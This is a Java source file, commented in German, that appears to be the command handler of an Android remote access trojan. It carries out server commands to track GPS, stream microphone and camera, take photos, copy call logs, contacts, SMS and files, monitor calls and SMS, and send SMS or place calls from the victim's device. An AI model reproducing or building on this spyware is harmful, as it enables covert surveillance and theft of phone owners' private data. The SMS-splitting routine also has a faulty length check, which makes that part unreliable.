package my.app.client;

import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.StringTokenizer;

import my.app.Library.*;
import utils.EncoderHelper;

import Packet.Packet;
import Packet.PreferencePacket;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Vibrator;
import android.preference.PreferenceManager;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;

import inout.Protocol;

/**
 * In dieser Klasse werden die von dem Server kommenden Befehlen verarbeitet, die entsprechenden Aktionen ausgew�hlt und gestartet.
 */
public class ProcessCommand
{
	short commande;
	ClientListener client;
	int chan;
	ByteBuffer arguments;
	Intent intent;

	SharedPreferences settings;
	SharedPreferences.Editor editor;

	/**
	 *  Der Konstruktor. Besorgt sich die Settings aus der preferences.xml und die settings des Editors.
	 * @param c Der Client
	 */
	public ProcessCommand(ClientListener c)
	{
		this.client = c;
		settings = client.getSharedPreferences("preferences.xml", 0);
		editor = settings.edit();
	}

	/**
	 * In dieser Methode wird das Agument verarbeitet und jenachdem die entsprechende Activity/Klasse und deren Methoden aufgerufen.
	 * @param cmd Das Argument, welches von dem Server kam.
	 * @param args	Die Argumente, die �bergeben wurden wie z.B. Nummer oder Provider.
	 * @param chan	Der Channel
	 */
	public void process(short cmd, byte[] args, int chan)
	{
		/**
		 * Hier werden die Klassenvariablen mit den �bergebenen Argumenten bef�llt
		 */
		this.commande = cmd;
		this.chan = chan;
		this.arguments = ByteBuffer.wrap(args);
		/**
		 * �berpr�ft welches command angekommen ist.
		 */
		if (commande == Protocol.GET_GPS_STREAM)
		{
			/**
			 * Sollte das GET_GPS_STREAM Kommando kommen so wird aus dem agruments-Array der Provider entnommen und in dem Sting provider gespeichert.
			 */
			String provider = new String(arguments.array());
			/**
			 * Hier wird �berpr�ft, ob der GPS-Sensor aktiviert ist oder ob die Ortung per Netzwerk geschehen kann, also das Ger�t mit einem Netzwerk verbunden ist.
			 * Ist dies der Fall wird ein neues Objekt der Klasse GPSListener in der Klassenvaiable der Klasse Client gespeichert.
			 * Sollte das Ger�t nicht verbunden sein, wird ein Error gesendet.
			 */
			if (provider.compareTo("network") == 0 || provider.compareTo("gps") == 0) {
				client.gps = new GPSListener(client, provider, chan);
				client.sendInformation("Location request received");
			}
			else
				client.sendError("Unknown provider '"+provider+"' for location");
		}
		/**
		 * Wenn es sich um das STOP_GPS_STREAM Kommando handelt, wird der in der Klasse Client gespeicherte GPSListener gestopt, gel�scht und die Information, dass dies geschehen ist an den Server gesendet.
		 */
		else if (commande == Protocol.STOP_GPS_STREAM)
		{
			client.gps.stop();
			client.gps = null;
			client.sendInformation("Location stopped");
		}
		/**
		 * Handelt es sich um das GET_SOUND_STREAM Kommando, wird die Information an den Server gesendet, ein neuer AudioStream erstellt, dieser in der Klassenvariablen der Klasse Client gespeichert
		 * und zum Schluss noch gestartet.
		 */
		else if (commande == Protocol.GET_SOUND_STREAM)
		{
			client.sendInformation("Audio streaming request received");
			client.audioStreamer = new AudioStreamer(client, arguments.getInt(), chan);
			client.audioStreamer.run();
		}
		/**
		 * Bei dem Kommando STOP_SOUND_STREAM wird der entsprechende AudioStream der Klasse Client gestoppt, gel�scht und die Information an den Server gesendet.
		 */
		else if (commande == Protocol.STOP_SOUND_STREAM)
		{
			client.audioStreamer.stop();
			client.audioStreamer = null;
			client.sendInformation("Audio streaming stopped");
		}
		/**
		 * Der Befehl GET_CALL_LOGS ruft die listCallLog Funktion der Klasse CAllLogListener.
		 * Sollte hier das Ergebnis false sein, wird ein Error gesendet, welcher besagt, dass keine CallLogs vorhanden sind.
		 */
		else if (commande == Protocol.GET_CALL_LOGS)
		{
			client.sendInformation("Call log request received");
			if (!CallLogLister.listCallLog(client, chan, arguments.array()))
				client.sendError("No call logs");
		}
		/**
		 * Der Befehl MONITOR_CALL �bergibt der Klassenvaiablen der Klasse Client ein neues Objekt der Klasse CallMonitor.
		 */
		else if (commande == Protocol.MONITOR_CALL)
		{
			client.sendInformation("Start monitoring call");
			client.callMonitor = new CallMonitor(client, chan, arguments.array());
		}
		/**
		 * Der Befehl STOP_MONITO_CALL beendet das Objekt der Variablen client.callMonitor, l�scht dieses und sendet dis Information an den Server.
		 */
		else if (commande == Protocol.STOP_MONITOR_CALL)
		{
			client.callMonitor.stop();
			client.callMonitor = null;
			client.sendInformation("Call monitoring stopped");
			
		}
		/**
		 * Der Befehlt GET_CONTACTS ruft die listContacts-Methode der Klasse ContactsLister auf.
		 * Sollte diese false zur�ckgeben, wird einen Error Nachricht gesendet, dass keine Kontakte auf dem Ger�t vorhanden sind.
		 */
		else if (commande == Protocol.GET_CONTACTS)
		{
			client.sendInformation("Contacts request received");
			if (!ContactsLister.listContacts(client, chan, arguments.array()))
				client.sendError("No contact to return");
			
		}
		/**
		 * Der Befehl LIST_DIR bekommt zus�tzlich den Pfad �bergeben von welchem die Auflistung der Ordner beginnen soll.
		 * Dieser Ordnername wird in dem String file zwischen gespeichert. Danach wird die listDir-Methode der Klasse DirLister aufgerufen.
		 * Sollte diese false zur�ckgeben, wird eine Fehlernachricht geschickt.
		 */
		else if (commande == Protocol.LIST_DIR)
		{
			client.sendInformation("List directory request received");
			String file = new String(arguments.array());
			if (!DirLister.listDir(client, chan, file))
				client.sendError("Directory: "+file+" not found");
			
		}
		/**
		 * Bei dem Befehl GET_FILE wird der Ordner per arguments-Array �bergeben.
		 * Danach wird ein neues Objekt der Klasse FileDownloader erzeugt und auf diesem die Methode downloadFile aufgerufen.
		 */
		else if (commande == Protocol.GET_FILE)
		{
			String file = new String(arguments.array());
			client.sendInformation("Download file "+file+" request received");
			client.fileDownloader = new FileDownloader(client);
			client.fileDownloader.downloadFile(file, chan);
			
		}
		/**
		 * Mit dem Befehl GET_PICTURE wird ein Objekt der Klasse PhotoTaker erstellt und die Methode takePhoto aufgerufen.
		 * Wird false zur�ckgeliefert, wird eine Fehlernachricht gesendet.
		 */
		else if (commande == Protocol.GET_PICTURE)
		{
			client.sendInformation("Photo picture request received");
			//if(client instanceof Client)
			//	client.sendError("Photo requested from a service (it will probably not work)");
			client.photoTaker = new PhotoTaker(client, chan);
			if (!client.photoTaker.takePhoto(args))
				client.sendError("Something went wrong while taking the picture");
			
		}
		/**
		 * Der Befehl DO_TOAST erzuegt ein neuen Toast mit dem Text, welcher in dem arguments-Array �bergeben wird.
		 * Danach wird dieser mit dem Aufruf der Funktion show auf dem Ger�t angezeigt.
		 */
		else if (commande == Protocol.DO_TOAST)
		{
			client.toast = Toast.makeText(client, new String(arguments.array()), Toast.LENGTH_LONG);
			client.toast.show();
			
		}
		/**
		 * Bei dem Befehl SEND_SMS wird aus dem arguments-Array die Nummer und der Sms-Body extrahiert und diese in den Variablen num und text gespeichtert.
		 */
		else if (commande == Protocol.SEND_SMS)
		{
			Map<String, String> information = EncoderHelper.decodeHashMap(arguments.array());
			String num = information.get(Protocol.KEY_SEND_SMS_NUMBER);
			String text = information.get(Protocol.KEY_SEND_SMS_BODY);
			/**
			 * Hier wird die L�nge �berpr�ft. Sollte diese L�nger als 167 Byte sein, m�ssen mehrere SMS gesendet werden.
			 * Dies wird dann mit dem Aufruf der Methode sendMultipartTextMessage getan.
			 * Sollte die L�nge passen, wird die Methode sendTextMessage aufgerufen.
			 */
			if (text.getBytes().length < 167)
				SmsManager.getDefault().sendTextMessage(num, null, text, null, null);
			else
			{
				ArrayList<String> multipleMsg = MessageDecoupator(text);
				SmsManager.getDefault().sendMultipartTextMessage(num, null, multipleMsg, null, null);
			}
			client.sendInformation("SMS sent");

		}
		/**
		 * Dieser Teil wird ausgef�hrt, wenn der Befehlt GIVE_CALL gesendet wurde.
		 * Hier wird aus dem arguments-Array die Telefonnummer extrahiert und der String tel: davor eingef�gt.
		 * Dieser String kann dann benutzt werden, um einen Intent zu erstellen, welcher die action ACTION_CALL �bergeben bekommt.
		 * Zus�tzlich wird die FLAG_ACTIVITY_NEW_TASK gesetzt. Im Anschluss wird der Intent gesendet und somit der Anruf get�tigt.
		 */
		else if (commande == Protocol.GIVE_CALL)
		{
			 String uri = "tel:" + new String(arguments.array()) ;
			 intent = new Intent(Intent.ACTION_CALL,Uri.parse(uri));
			 intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			 client.startActivity(intent);
			 
		}
		/**
		 * Sollte der Befehl GET_SMS gesendet werden so wird die Methode listSMS der Klasse SMSLIster aufgerufen und das arguments_array wird dieser Methode �bergeben.
		 * Das Array fungieren hier als der Filter, welchen der Benutzer eingeben kann. Sollte hier als Resultat false geliefert werden, gab es keine SMS die auf diesen Filter zutreffen.
		 */
		else if (commande == Protocol.GET_SMS)
		{
			client.sendInformation("SMS list request received");
			if(!SMSLister.listSMS(client, chan, arguments.array()))
				client.sendError("No SMS match for filter");
			
		}
		/**
		 * Mit dem Befehl MONITOR_SMS wird ein neues Objekt der Klasse SMSMonitor erstellt und der Klassenvaribale der Client Klasse zugewiesen.
		 */
		else if (commande == Protocol.MONITOR_SMS)
		{
			client.sendInformation("Start SMS monitoring");
			client.smsMonitor = new SMSMonitor(client, chan, arguments.array());
			
		}
		/**
		 * Sollte der Befehl STOP_MONITOR_SMS empfangen werden, wird das smsMonitor Objekt gestoppt und gel�scht.
		 */
		else if (commande == Protocol.STOP_MONITOR_SMS)
		{
			client.smsMonitor.stop();
			client.smsMonitor = null;
			client.sendInformation("SMS monitoring stopped");
		}
		/**
		 * Wird der Befehl GET_PREFERENCE gesendet, sendet der Client die Preferences an den Server.
		 * Hierzu wird der Befehl handleData aufgerufen.
		 */
		else if (commande == Protocol.GET_PREFERENCE)
		{
			client.handleData(chan, loadPreferences().build());
		}
		/**
		 * Mit dem Befehel SET_PREFERENCE werden die gesendeten PREFERENCES gespeichtert, indem die Methode savePreferences aufgerufen wird.
		 * Das arguments-Array bietet hier die Einstellungsdaten an.
		 */
		else if (commande == Protocol.SET_PREFERENCE)
		{
			client.sendInformation("Preferences received");
			savePreferences(arguments.array());
			client.loadPreferences(); //Reload the new config for the client
		}
		/**
		 * Der Befehl GET_ADV_INFOMATIONS erstellt ein Obejekt der Klasse AdvancedSystemInfo und ruft auf diesem die Methode getInfos() auf.
		 */
		else if(commande == Protocol.GET_ADV_INFORMATIONS) {
			client.advancedInfos = new AdvancedSystemInfo(client, chan);
			client.advancedInfos.getInfos();
		}
		/**
		 * Durch den Befehl OPEN_BROWSER wird ein neuer Intent erstellt, welcher die URL, die aus dem arguments-Array extrahiert wurde,
		 * und die Action ACTION_VIEW erh�lt. Zus�tzlich wird die FLAG_ACTIVITY_NEW_TASK gesetzt.
		 * Im Anschluss wird der Intent abgeschickt und somit die Activity, die ihn empf�ngt gestartet.
		 */
		else if(commande == Protocol.OPEN_BROWSER) {
			 String url = new String(arguments.array()) ;
			 Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
			 i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			 client.startActivity(i);
		}
		/**
		 * Sollter der Befehel DO_VIBRATE gesendet werden, wird ein neuer Vibrator_service erstellt.
		 * Das arguments-Array liefert wie lange das Ger�t vibrieren soll. Durch den Aufruf der Methode virbrate der Vibrator gestartet.
		 */
		else if(commande == Protocol.DO_VIBRATE) {
			Vibrator v = (Vibrator) client.getSystemService(Context.VIBRATOR_SERVICE);
			long duration = arguments.getLong();
			v.vibrate(duration);

		}
		/**
		 * Wird der Befehl GET_VIDEO_STREAM empfangen, wird ein Objekt der Klasse VideoStreamer erstellt und jenachdem welche Option auf dem Server gew�hlt wurde, die entsprechende Methode gestartet.
		 */
		else if (commande == Protocol.GET_VIDEO_STREAM){
			client.sendInformation("Video streaming request received");
			client.videoStreamer = new VideoStreamer(client,args,chan);
			if(args[1] == 0) {
				client.videoStreamer.startStream();
			}
			else{
				client.videoStreamer.startRec();
			}
		}
		/**
		 * Wird der Befehl STOP_VIDEO_STREAM gesendet so wird die Aufnahme oder der Stream beendet und das Objekt gel�scht.
		 */
		else if (commande == Protocol.STOP_VIDEO_STREAM){
			if(client.videoStreamer.getRecord()) {
				client.videoStreamer.stopRec();
			}
			else {
				client.videoStreamer.stopStream();
			}
			client.videoStreamer = null;
			client.sendInformation("Video streaming stopped");

		}
		/**
		 * Wenn der Befehl TORCH gesendet wird, wird ein neues Objekt der Klasse Torch erstellt und mit der Methode turnOnFlash der Blitz angestellt.
		 */
		else if(commande == Protocol.TORCH){
			client.torch = new Torch(client);
			if (!client.torch.turnOnFlash()){
				client.sendError("No Flash available");
			}
		}
		/**
		 * Wenn der Befehl STOP_TORCH gesendet wird, wird die Methode turnOffFlash aufgerufen und das Objekt der Klasse Torch gel�scht.
		 */
		else if(commande == Protocol.STOP_TORCH){
			client.torch.turnOffFlash();
			client.torch = null;
		}
		else if(commande == Protocol.SET_ALARM){
			client.setAlarm = new SetAlarm(client);
			client.setAlarm.SetAlarm(args);
		}
		/**
		 * Mit dem Befehl DISCONNECT wird der Service client zerst�rt und somit das Programm beendet.
		 */
		else if(commande == Protocol.DISCONNECT) {
			client.finish();
		}
		/**
		 * Mit der letzen Abfrage werden unbekannte Befehle abgefangen und ein Error gesendet.
		 */
		else {
			client.sendError("Command: "+commande+" unknown");
		}
			
	}

	/**
	 * Erstellt ein PreferencePacket und gibt dies zur�ck.
	 * @return	PreferencePacket
	 */
	public PreferencePacket loadPreferences()
	{
		/**
		 * p	Neues PreferencePacket
		 */
		PreferencePacket p = new PreferencePacket();
		/**
		 * L�dt den Inthalt aus der xml/preferences Datei und speichert diese in settings.
		 */
		SharedPreferences settings = client.getSharedPreferences("preferences", 0);
		/**
		 * Setzt die Ip in p in dem es aus settings das Feld Ip abfr�gt. Ist dies nicht vorhanden so wird als default 192.168.137.1 zur�ckgegeben.
		 */
		p.setIp( settings.getString("ip", "192.168.137.1"));
		/**
		 * Set den Port in p, wenn kein Port vorhanden war wird der default Wert 9999 verwendet.
		 */
		p.setPort (settings.getInt("port", 9999));
		/**
		 * Setzt den WaitTrigger in p. Sollte kein Wert vorhanden sein wir als Default-Wert false gesetzt.
		 */
		p.setWaitTrigger(settings.getBoolean("waitTrigger", false));
		/**
		 * Neue ArrayList smsKeywords
		 */
		ArrayList<String> smsKeyWords = new ArrayList<String>();
		/**
		 * Holt die Keywords aus settings und speichert sie in keywords ab. Der default ist der leere String.
		 */
		String keywords = settings.getString("smsKeyWords", "");
		/**
		 * �berpr�fen ob es Keywords gibt.
		 */
		if(keywords.equals(""))
		/**
		 * Wenn nicht wird smsKeywWords auf null gesetzt.
		 */
			smsKeyWords = null;
		else {
			/**
			 * Ansonsten wird ein StringTokenizer erzeugt, welcher den String in Tokens unterteilt sobald ein Semikolon in dem String vorkommt.
			 */
			StringTokenizer st = new StringTokenizer(keywords, ";");
			while (st.hasMoreTokens())
			{
				/**
				 * Die einzelnen Token werden dem SMSKeyword-Array hinzugef�gt.
 				 */
				smsKeyWords.add(st.nextToken());
			}
			/**
			 * Schlie�lich wird die ArrayList p hinzugef�gt.
			 */
			p.setKeywordSMS(smsKeyWords);
		}
		/**
		 * Erstellt eine ArrayList whiteListCall
		 */
		ArrayList<String> whiteListCall = new ArrayList<String>();
		/**
		 * Inhalt aus settings extrahieren. Wenn kein Inhalt vorhanden ist wird als default der leere String zur�ckgeliefert.
		 */
		String listCall = settings.getString("numCall", "");
		/**
		 * �berpr�fen ob der String einen Inhalt hat.
		 */
		if(listCall.equals(""))
		/**
		 * Wenn nicht wird die ArrayList auf null gesetzt.
		 */
			whiteListCall = null;
		else {
			/**
			 * Ansosnten wird ein StringTokenizer erstellt um den String in Token zu unterteilen wenn ein Semikolon im String vorkommt.
			 */
			StringTokenizer st = new StringTokenizer(listCall, ";");
			while (st.hasMoreTokens())
			{
				/**
				 * Die Token werden dann de ArrayList hinzugef�gt.
				 */
				whiteListCall.add(st.nextToken());
			}
			/**
			 * Die Liste wird anschlie�end p hinzugef�gt.
			 */
			p.setPhoneNumberCall(whiteListCall);
		}
		
		/**
		 * Hier wird eine WhiteList f�r SMS-Nummern erzeugt.
		 * Auch hierf�r wird eine ArrayList erstellt. Diese nennt sich whiteListSMS
		 */
		ArrayList<String> whiteListSMS = new ArrayList<String>();
		/**
		 * Im Anschluss wird der Inhalt aus settings extrahiert.
		 */
		String listSMS = settings.getString("numSMS", "");
		/**
		 * Danach wird �berpr�ft, ob der String einen Ihnhalt hat, wenn nicht wird die ArrayList auf null gesetzt
		 */
		if(listSMS.equals(""))
			whiteListSMS = null;
		else {
			/**
			 * Ansonsten wird der String mit Hilfe eines StringTokenizer in Token unterteilt.
			 */
			StringTokenizer st = new StringTokenizer(listSMS, ";");
			while (st.hasMoreTokens())
			{
				/**
				 * Die einzelnen Token werden der ArrayList whiteListSMS hinzugef�gt.
				 */
				whiteListSMS.add(st.nextToken());
			}
			/**
			 * Und p die whiteListSMS hinzugef�gt.
			 */
			p.setPhoneNumberSMS(whiteListSMS);
		}
		/**
		 * Zum Schluss wird nun das PreferencePacket p zur�ckgegeben.
		 */
		return p;
	}

	/**
	 * Bekommt ein Byte Array und schreibt den Inhalt in die xml/preferences Datei.
	 * @param data byte Array mit den Preferneces-Daten
	 */
	private void savePreferences(byte[] data)
	{
		/**
		 * Erstellen eines neuen PreferencesPacket pp
		 */
		PreferencePacket pp = new PreferencePacket();
		/**
		 * Parsen der Daten damit diese in pp gespeichert werden.
		 */
		pp.parse(data);
		/**
		 * Die xml/prefereces Datei auslesen und in settings speichern.
		 */
		SharedPreferences settings = client.getSharedPreferences("preferences", 0);
		/**
		 * Einen Editor erstellen um settigs zu ver�ndern.
		 */
		SharedPreferences.Editor editor = settings.edit();
		/**
		 * Die Ip aus pp in Settings schreiben
		 */
		editor.putString("ip", pp.getIp());
		/**
		 * den Port aus pp in den settings schreiben
		 */
		editor.putInt("port", pp.getPort());
		/**
		 * den waitTrigger in settings schreiben
		 */
		editor.putBoolean("waitTrigger", pp.isWaitTrigger());
		/**
		 * Strings erstellen um die smsKeyWords, numsCall und numsSMS zwischenzuspeichern.
		 */
		String smsKeyWords = "";
		String numsCall = "";
		String numsSMS = "";
		/**
		 * Die smsKeyWord Arrayliste aus pp f�r jedes Elemten durchgehen
		 */
		ArrayList<String> smsKeyWord = pp.getKeywordSMS();
		for (int i = 0; i < smsKeyWord.size(); i++)
		{
			/**
			 * �berpr�fen ob das letze Element erreicht ist.
			 */
			if (i == (smsKeyWord.size() - 1))
			/**
			 * Wenn das Ende erreicht ist, nur den Sting an smsKeyWords anh�ngen.
			 */
				smsKeyWords += smsKeyWord.get(i);
			else
			/**
			 * Ansonsten den String + ein Semikolon anh�ngen.
			 */
				smsKeyWords += smsKeyWord.get(i) + ";";
		}
		/**
		 * Die smsKeywords in settings ver�ndern.
		 */
		editor.putString("smsKeyWords", smsKeyWords);
		/**
		 * Die whiteListCall ArrayList aus pp holen.
		 */
		ArrayList<String> whiteListCall = pp.getPhoneNumberCall();
		/**
		 * Die ArrayList durchgehen.
		 */
		for (int i = 0; i < whiteListCall.size(); i++)
		{
			/**
			 * �berpr�fen ob Letzes Element.
			 */
			if (i == (whiteListCall.size() - 1))
			/**
			 * Nur den String an numsCall anh�ngen.
			 */
				numsCall += whiteListCall.get(i);
			else
			/**
			 * Sollte es nicht das letze Element sein so wird der Sting und ein Semikolon angeh�ngt.
			 */
				numsCall += whiteListCall.get(i) + ";";
		}
		/**
		 * Den String numsCall in settings schreib/ver�ndern
		 */
		editor.putString("numCall", numsCall);

		/**
		 * Auslesen der whiteListSMS aus pp.
		 */
		ArrayList<String> whiteListSMS = pp.getPhoneNumberSMS();
		/**
		 * Die ArrayList durgehen
		 */
		for (int i = 0; i < whiteListSMS.size(); i++)
		{
			/**
			 * �berpr�fen ob es sich um das letze Element handelt.
			 */
			if (i == (whiteListSMS.size() - 1))
			/**
			 * Falls ja wird dem String numsSMS nur der String an der Stelle i hinzugef�gt.
			 */
				numsSMS += whiteListSMS.get(i);
			else
			/**
			 * Falls es nicht das letze Element ist wird numsSMS der String und ein Semikolon angeh�ngt.
			 */
				numsSMS += whiteListSMS.get(i) + ";";
		}
		/**
		 * Nun wird in der Sting noch in settings geschrieben.
		 */
		editor.putString("numSMS", numsSMS);
		/**
		 * Zum Schluss werden die �nderungen noch in die Datei geschrieben.
		 */
		editor.commit();

	}

	/**
	 * Erstellt eine ArrayList<String> bei der jedes Element kleiner gleich 167 Elementen lang ist.
	 * @param text Bekommt den Text einer SMS
	 * @return Die ArrayListe mit den Nachrichten der SMS
	 */
	private ArrayList<String> MessageDecoupator(String text)
	{
		ArrayList<String> multipleMsg = new ArrayList<String>();

		int taille = 0;
		/**
		 * Solange taille kleiner als die L�nge des Textes ist.
		 */
		while (taille < text.length())
		{
			/**
			 * �berpr�fen ob taille - Textl�nge kleiner als 167 ist
			 */
			if ((taille - text.length()) < 167)
			{
				/**
				 * Wenn dies der Fall ist, dann wird der substring von taille bis Zur L�nge vom Text der StringArrayList hinzugef�gt
				 */
				multipleMsg.add(text.substring(taille, text.length()));
			} else
			{
				/**
				 * Wenn der Text L�nger ist als 167, wird dieserIDE in 167 gro�e Teile zerlegt und jeder Teil zu mutliplMsg hinzugef�gt.
				 */
				multipleMsg.add(text.substring(taille, taille + 167));
			}
			/**
			 * taille im 167 erh�hen.
			 */
			taille += 167;
		}
		/**
		 * ArrayList zur�ckliefern.
		 */
		return multipleMsg;
	}

}
